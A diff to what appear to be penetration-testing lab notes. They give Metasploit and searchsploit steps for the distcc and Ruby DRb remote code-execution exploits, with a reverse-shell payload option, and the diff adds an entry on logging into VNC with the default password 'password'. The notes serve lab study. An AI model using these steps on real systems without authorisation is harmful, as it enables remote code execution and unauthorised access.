@@ -222,11 +222,14 @@ search 'ccd' in msfc and select the following:
 > use exploit/unix/misc/distcc_exec
 set options (RHOSTS, LHOST[if revshell is set as payload]) and 'exploit'
 
-[VIDEO (Ruby DRb RMI )]
+[VIDEO (Ruby DRb RMI Command Execution)]
 in this case we search for ruby drb but we get no luck in msfc so using searchsploit we find out the exploit named as 'Distributed Ruby - Send instance_eval/syscall Code Execution (Metasploit)'
 but in msf6 it is not present, so we need to proceed with the searchsploit by find out the path of that script which is done the following cmd:
 > searchsploit -p <path_column_number> (in our case path_column_number = 17058)
-try copying it to the msf linux/misc module and execute it in msfc as follows:
+try copying the file to the msf's linux/misc module and execute it in msfc as follows:
 > use exploit/linux/misc/<name_of_script>.rb
 set options and 'exploit'
 
+[VIDEO (VNC Protocol 3.3 (Default Password))]
+using vncviewer application in Kali linux we can connect it with the default password as follows:
+> vncviewer <target_ip> (default password: password)
